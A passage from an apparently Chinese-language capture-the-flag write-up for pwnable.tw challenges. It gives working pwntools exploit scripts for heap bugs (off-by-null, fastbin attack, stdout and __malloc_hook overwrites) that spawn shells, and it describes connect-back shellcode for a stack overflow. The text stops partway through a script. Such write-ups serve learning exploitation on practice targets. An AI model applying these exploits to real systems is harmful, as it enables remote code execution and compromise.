io.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line">    <span class="keyword">if</span>(choice == <span class="number">1</span>):</span><br><span class="line">        get_author(name)</span><br><span class="line"></span><br><span class="line">get_author(<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x18</span>) <span class="comment">#0</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\xe1\x0f\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">menu(<span class="number">4</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">heapbase = u64(io.recvline(keepends=<span class="literal">False</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;heapbase ===&gt; &#x27;</span>+<span class="built_in">hex</span>(heapbase))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x50</span>, <span class="string">b&#x27;A&#x27;</span>)   <span class="comment">#1 - 7</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Content :\n&#x27;</span>)</span><br><span class="line">libcbase = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3c4141</span></span><br><span class="line">log.success(<span class="string">&#x27;libcbase ===&gt; &#x27;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line">_IO_list_all = libcbase + libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">b&#x27;A&#x27;</span>) <span class="comment">#8</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0x61</span>) + p64(<span class="number">0</span>) + p64(_IO_list_all-<span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xd8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file_add = heapbase + <span class="number">0x2d0</span> + <span class="number">0xd8</span></span><br><span class="line"></span><br><span class="line">payload += p64(fake_file_add+<span class="number">8</span>)</span><br><span class="line">payload +=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(libcbase+libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x2d0</span> + payload)</span><br><span class="line"><span class="comment">#DEBUG()</span></span><br><span class="line">menu(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Size&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;16&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<h2 id="0x15-CAOV"><a href="#0x15-CAOV" class="headerlink" title="0x15. CAOV"></a>0x15. CAOV</h2><h2 id="0x16-Heap-Paradise"><a href="#0x16-Heap-Paradise" class="headerlink" title="0x16. Heap Paradise"></a>0x16. Heap Paradise</h2><p>exp:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#先fastbin attack分配到堆区域修改某个堆块的size，使得可以free进入unsorted bin，然后partial write爆破stdout结构体，输出libc，最后fastbin attack打malloc_hook</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10308</span>)</span><br><span class="line">file = <span class="string">&#x27;./heap_paradise&#x27;</span></span><br><span class="line"><span class="comment">#io = process(file)</span></span><br><span class="line">elf = ELF(file)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc_64.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">num</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;You Choice:&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(num).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size, data</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Size :&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Data :&#x27;</span>)</span><br><span class="line">    io.send(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Index :&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DEBUG</span>():</span><br><span class="line">    attach(io, <span class="string">&#x27;set resolve-heap-via-heuristic on&#x27;</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x71</span>))     <span class="comment">#0            loc-0</span></span><br><span class="line">alloc(<span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x31</span>)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x28</span>+p64(<span class="number">0x21</span>))     <span class="comment">#1            loc-1</span></span><br><span class="line">	     <span class="comment">#2            loc-2</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)             <span class="comment">#0 -&gt; 1 -&gt; 0</span></span><br><span class="line">alloc(<span class="number">0x68</span>, <span class="string">b&#x27;\x20&#x27;</span>)     <span class="comment">#2    loc-0</span></span><br><span class="line">alloc(<span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>)     <span class="comment">#3    loc-1</span></span><br><span class="line">alloc(<span class="number">0x68</span>, <span class="string">b&#x27;\x20&#x27;</span>)     <span class="comment">#4    loc-0</span></span><br><span class="line">alloc(<span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>)    <span class="comment">#5    loc-0.5</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">alloc(<span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0xa1</span>))   <span class="comment">#6</span></span><br><span class="line">free(<span class="number">5</span>)             <span class="comment">#进入unsorted bin</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">alloc(<span class="number">0x78</span>, (p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>))*<span class="number">4</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x8</span>+p64(<span class="number">0x71</span>)+<span class="string">b&#x27;\xa0&#x27;</span>)          <span class="comment">#7    loc-0.5    partial overwrite修改到stdout</span></span><br><span class="line">alloc(<span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x28</span>+p64(<span class="number">0x71</span>)+<span class="string">b&#x27;\xdd\xc5&#x27;</span>)          <span class="comment">#8      loc-1    partial overwrite将loc-0.5放入fastbin链表中</span></span><br><span class="line">alloc(<span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>))          <span class="comment">#9      loc-0</span></span><br><span class="line">alloc(<span class="number">0x68</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">3</span>+<span class="string">b&#x27;B&#x27;</span>*<span class="number">0x30</span>+p64(<span class="number">0xfbad2087</span>+<span class="number">0x1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>)          <span class="comment">#10     修改stdout结构体</span></span><br><span class="line">               <span class="comment">#(__IO_stdout)c620-0x43=c5dd</span></span><br><span class="line">leak = io.recv(<span class="number">100</span>)</span><br><span class="line"><span class="built_in">print</span>(leak)</span><br><span class="line">loc = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">b&#x27;\x7f&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> leak:</span><br><span class="line">    <span class="keyword">raise</span> Exception()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> leak:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">0x7f</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    loc += <span class="number">1</span></span><br><span class="line">libcbase = u64((leak[:loc+<span class="number">1</span>])[loc-<span class="number">5</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3c4600</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libcbase ===&gt; &#x27;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line">one_gadget = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xef6c4</span>, <span class="number">0xf0567</span>]</span><br><span class="line">malloc_hook = libcbase + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">target = malloc_hook - <span class="number">0x23</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;__malloc_hook ===&gt; &#x27;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x48</span>+p64(<span class="number">0x71</span>)+p64(target))   <span class="comment">#11        chunk overlapping修改fd</span></span><br><span class="line">alloc(<span class="number">0x68</span>, <span class="string">b&#x27;AAAA&#x27;</span>)      <span class="comment">#12</span></span><br><span class="line">alloc(<span class="number">0x68</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x13</span> + p64(libcbase+one_gadget[<span class="number">2</span>]))  <span class="comment">#13</span></span><br><span class="line">menu(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Size :&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;16&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#DEBUG()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<h2 id="0x17-Re-alloc-Revenge"><a href="#0x17-Re-alloc-Revenge" class="headerlink" title="0x17. Re-alloc Revenge"></a>0x17. Re-alloc Revenge</h2><h2 id="0x18-MnO2"><a href="#0x18-MnO2" class="headerlink" title="0x18. MnO2"></a>0x18. MnO2</h2><h2 id="0x19-Secret-Of-My-Heart"><a href="#0x19-Secret-Of-My-Heart" class="headerlink" title="0x19. Secret Of My Heart"></a>0x19. Secret Of My Heart</h2><p>libc-2.23.so  这道题也是一道常规堆题，程序首先开辟了一块随机区域来作为secret的存储区域，显然该区域位置可预测。</p>
<p>分析该程序后可以发现该区域可以看成一个结构体数组，结构如下</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> chunk_struct struc ; (<span class="keyword">sizeof</span>=<span class="number">0x30</span>, mappedto_8)</span><br><span class="line"><span class="number">00000000</span> size dq ?</span><br><span class="line"><span class="number">00000008</span> name db <span class="number">32</span> dup(?)</span><br><span class="line"><span class="number">00000028</span> secret_of_heart dq ?</span><br><span class="line"><span class="number">00000030</span> chunk_struct ends</span><br></pre></td></tr></table></figure></div>

<p><code>secret_of_heart</code>为指针，存储分配的chunk。</p>
<p>同时在add功能中可以发现<code>off-by-null</code>漏洞</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__fastcall <span class="title function_">sub_D27</span><span class="params">(chunk_struct *a1, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  a1-&gt;size = size;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Name of heart :&quot;</span>);</span><br><span class="line">  my_read(a1-&gt;name, <span class="number">0x20</span>u);</span><br><span class="line">  a1-&gt;secret_of_heart = (__int64)<span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( !a1-&gt;secret_of_heart )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocate Error !&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;secret of my heart :&quot;</span>);</span><br><span class="line">  result = (_BYTE *)(a1-&gt;secret_of_heart + (<span class="type">int</span>)my_read((<span class="type">void</span> *)a1-&gt;secret_of_heart, size));</span><br><span class="line">  *result = <span class="number">0</span>;                                  <span class="comment">// off-by-null</span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>name</code>字段的长度为0x20，但读取长度最大也是0x20，因此在puts时可顺带泄露出后面的指针。</p>
<p>然后就是已知堆地址，存在<code>off-by-null</code>的堆攻击了。就继续按照上面提到的方式利用就行了，不过这个可以不用伪造堆块了，改下fd bk绕过一下unlink就行了。</p>
<p>然后会得到重叠堆块，且chunk0未被释放，那就可以直接使用<code>fastbin attack</code>打<code>__malloc_hook</code>了</p>
<p>这道题需要使用<code>realloc</code>函数来调整栈帧，我用<code>0x4526a</code>这个one_gadget和<code>realloc+13</code>这个偏移能打通</p>
<p>exp:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = remote(&#x27;chall.pwnable.tw&#x27;,10302)</span></span><br><span class="line">io = process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc_64.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DEBUG</span>():</span><br><span class="line">    attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">choice</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, name, content</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Size of heart : &#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Name of heart :&#x27;</span>)</span><br><span class="line">    io.send(name)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;secret of my heart :&#x27;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Index :&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">index</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Index :&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf0</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;A&#x27;</span>)      <span class="comment">#0</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">heapbase = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x10</span></span><br><span class="line">log.success(<span class="string">&#x27;heapbase ===&gt; &#x27;</span>+<span class="built_in">hex</span>(heapbase))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf0</span>, <span class="string">b&#x27;A&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>)           <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0xf0</span>, <span class="string">b&#x27;A&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>)           <span class="comment">#2</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">target = heapbase + <span class="number">0x20</span></span><br><span class="line">add(<span class="number">0xf8</span>, <span class="string">b&#x27;A&#x27;</span>, p64(target-<span class="number">0x18</span>)+p64(target-<span class="number">0x10</span>)+p64(heapbase)+<span class="string">b&#x27;A&#x27;</span>*<span class="number">0xd8</span>+p64(<span class="number">0x100</span>))   <span class="comment">#0</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Secret : &#x27;</span>)</span><br><span class="line">libcbase = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3c3b78</span></span><br><span class="line">log.success(<span class="string">&#x27;libcbase ===&gt; &#x27;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line">__malloc_hook = libcbase + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">realloc = libcbase + libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">one_gadget = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xef6c4</span>, <span class="number">0xf0567</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#fastbin attack打__malloc_hook</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">b&#x27;A&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>)           <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">b&#x27;A&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>)           <span class="comment">#3</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">b&#x27;A&#x27;</span>, p64(__malloc_hook-<span class="number">0x23</span>))  <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">b&#x27;A&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>)                   <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">b&#x27;A&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>)                   <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">b&#x27;A&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0xb</span>+p64(libcbase+one_gadget[<span class="number">1</span>])+p64(realloc+<span class="number">13</span>))                   <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">menu(<span class="number">1</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;16&#x27;</span>)</span><br><span class="line">io.sendafter(<span class="string">b&#x27;Name of heart :&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#DEBUG()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<h2 id="0x1a-Kidding"><a href="#0x1a-Kidding" class="headerlink" title="0x1a. Kidding"></a>0x1a. Kidding</h2><p>32位裸栈溢出，close 0 1 2</p>
<p>首先就应该想到利用socket，connect来打</p>
<p>不过仅用ROP的话明显不行，这里学到了用<code>_dl_make_stack_executable</code>来使栈可执行，同时写入shellcode，并<code>jmp esp</code></p>
<p>来看<code>_dl_make_stack_executable</code>函数</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> __usercall dl_make_stack_executable@&lt;eax&gt;(_DWORD *a1@&lt;eax&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *a1 != _libc_stack_end )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  result = mprotect(*a1 &amp; -dl_pagesize, dl_pagesize, _stack_prot);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    <span class="keyword">return</span> *(_DWORD *)(__readgsdword(<span class="number">0</span>) - <span class="number">24</span>);</span><br><span class="line">  *a1 = <span class="number">0</span>;</span><br><span class="line">  dl_stack_flags |= <span class="number">1u</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>传入了eax，因此需要将<code>_libc_stack_end</code>的地址传入eax，然后再调用该函数，在那之前需要设置<code>_stack_prot</code>为7（可读可写可执行）</p>
<p>写入的shellcode执行<code>socket(2,1,0)</code>，<code>connect()</code>，然后可以直接在你连接的服务器上给程序发送数据，写入更多shellcode</p>
<p>在服务器端监听对应端口，并dup2()对应fd到标准输入0，标准输出1，然后直接<code>execve(&quot;/bin/sh&quot;, 0, 0)</code>，就会发现得到了一个shell</p>
<p>本地exp</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10303</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./kidding&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./kidding&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x0805462b : mov dword ptr [edx], eax ; ret</span></span><br><span class="line">mov_val = <span class="number">0x0805462b</span></span><br><span class="line"></span><br><span class="line">pop_ecx_ebx = <span class="number">0x806ecb1</span></span><br><span class="line">pop_eax = <span class="number">0x80b8536</span></span><br><span class="line">pop_edx = <span class="number">0x806ec8b</span></span><br><span class="line">pop_ebx = <span 